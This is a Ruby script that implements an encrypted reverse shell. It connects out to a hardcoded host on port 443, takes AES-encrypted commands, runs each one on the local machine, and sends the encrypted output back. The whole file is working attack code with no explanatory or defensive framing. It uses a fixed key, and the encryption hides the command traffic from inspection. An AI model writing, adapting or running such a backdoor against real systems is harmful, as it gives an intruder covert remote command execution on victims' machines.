#!/usr/bin/env ruby
require 'openssl'
require 'base64'
require 'socket'
require 'open3'
def encrypt(command)
	@aes.encrypt
	@aes.key = @key
	#aes.iv = iv
	encrypted_data = @aes.update(command) + @aes.final
	encoded_command = Base64.encode64(encrypted_data)
	return encoded_command
end
def decrypt(command)
	@aes.decrypt
	@aes.key = @key
	#aes.iv = iv
	base64_data = command
	decode_data = Base64.decode64(base64_data)
	decrypt_data = @aes.update(decode_data) + @aes.final
	return decrypt_data
end
def command_loop(s)
	loop {
		command = s.recv(1024)
		command = command.chomp
		decrypt_data = decrypt(command)
		exit if decrypt_data == 'exit'
		#exit if command == 'exit'
		stdin, stdout_and_stderr, wait_thr = Open3.popen2e("#{decrypt_data}")
		encrypted_data = encrypt("#{stdout_and_stderr.readlines.join.chomp}\0")
		#s.print("#{stdout_and_stderr.readlines.join.chomp}\0")
		s.print("#{encrypted_data}")
	}
	rescue
		#@s.puts("command does not exist\0")
		encrypted_data = encrypt("command does not exist\0")
		@s.print(encrypted_data)
		command_loop(@s) 
end
def connect_to_host()
	hostname = '127.0.0.1'
	port = 443
	@s = TCPSocket.open(hostname, port)
	command_loop(@s)
end
begin
	@aes = OpenSSL::Cipher.new("AES-256-CFB")
	#rand_key = 32.times.map {[*'a'..'z',*'A'..'Z',*'0'..'9',*'!'..')'].sample}.join
	@key = 'abcdefghijklmnopqrstuvwxyz123456'
	connect_to_host()
end